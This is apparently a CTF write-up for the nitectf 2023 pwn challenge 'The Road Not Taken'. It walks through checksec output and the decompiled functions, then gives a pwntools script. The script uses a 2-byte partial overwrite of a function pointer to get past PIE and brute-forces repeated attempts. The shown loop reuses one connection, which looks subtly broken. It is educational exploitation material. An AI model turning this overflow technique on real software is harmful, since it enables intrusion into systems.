---
title: The Road Not Taken
author: capang
date: 2024-01-03 09:30:00 +0800
categories: [Writeups, PWN]
tags: [nitectf 2023]
math: true
mermaid: true
---

# Overview

The main goal is to manipulate the execution flow by exploiting PIE randomization into calling the `right_direction` function.

## Source File

[Download Source File]({{site.url}}/assets/files/road_not_taken.zip)

## Analysis

File check

```bash
$ file the_road_not_taken1 
the_road_not_taken1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fbde2c5d6b8f1315d7b2634ae43d339d49aaa455, for GNU/Linux 4.4.0, not stripped
```

Security Check

```bash
checksec --file the_road_not_taken1 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

**Key Findings**
- file is a 64bit binary
- dynamically linked -> means it will fetch libc functions
- not stripped -> functions name stays, we can see it in ghidra/ida
Security 
- no stack canary, possible buffer overflow
- PIE, address of the functions/gadgets will be randomized

**Execution Testing**

```bash
$ ./the_road_not_taken1 
Can you please lead me to the right direction to get to the flag?
yoko
This doesn't look like the right direction are u sure
```

```bash
./the_road_not_taken1 
Can you please lead me to the right direction to get to the flag?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
This doesn't look like the right direction are u sure
```

hm, no seg fault? no overflow?

**Decompiler checking**

`main function`

```
void main(void)

{
  undefined local_218 [520];
  code *local_10;
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  local_10 = wrongdirection;
  puts("Can you please lead me to the right direction to get to the flag?");
  read(0,local_218,0x20a);
  (*local_10)();
  return;
}

```

`wrong_direction`

```
void wrongdirection(void)

{
  puts("This doesn\'t look like the right direction are u sure");
  return;
}
```
right_direction
```
void rightdirection(void)

{
  puts("Thanks for the help");
  puts("nite{not_the_real_flag}");
  return;
}
```

There is indeed buffer overflow in the main function!
Its just damn big.

```C
undefined local_218 [520]; # buffer size 520
read(0,local_218,0x20a); # reads 0x20a = 522
```

so we can only overflow 2 bytes, not enough to replace all of the return address to go to right_direction functions

however last 2 bytes of PIE wont change 
"Due to the way PIE randomisation works, the base address of a PIE executable will **always** end in the hexadecimal characters `000`. This is because **pages** are the things being randomised in memory, which have a standard size of `0x1000`. Operating Systems keep track of page tables which point to each section of memory and define the permissions for each section, similar to segmentation.

Checking the base address ends in `000` should _probably_ be the first thing you do if your exploit is not working as you expected." from https://ir0nstone.gitbook.io/notes/types/stack/pie 

# Solution

we can find the offset of the right_direction function and put it at the end of our payload

```python
io = start()
padding = 520
right = elf.symbols.rightdirection
offset = b'A'*padding
offset = b'A'*520
payload = offset + b'\x59\x11'
io.recvline()
io.sendline(payload)
print(io.recvline())
print(io.recvline())
```

however this wont work because the offset will be added into the base address
example:
- base address = 0x11111000
- right_direction offset = 0x1000
- right_direction address = 0x11112000
To solve this we need to loop many times through the connection and get the base address fit with our payload


``` python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './the_road_not_taken1'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()
padding = 520
right = elf.symbols.rightdirection
offset = b'A'*padding


for j in range(0,100):

    try:

        offset = b'A'*520
        payload = offset + b'\x59\x11'
        io.recvline()
        io.sendline(payload)
        print(io.recvline())
        print(io.recvline())
    except EOFError:
        pass

```

nite{R0b3rT_fro5t_ftw_32dx5hp}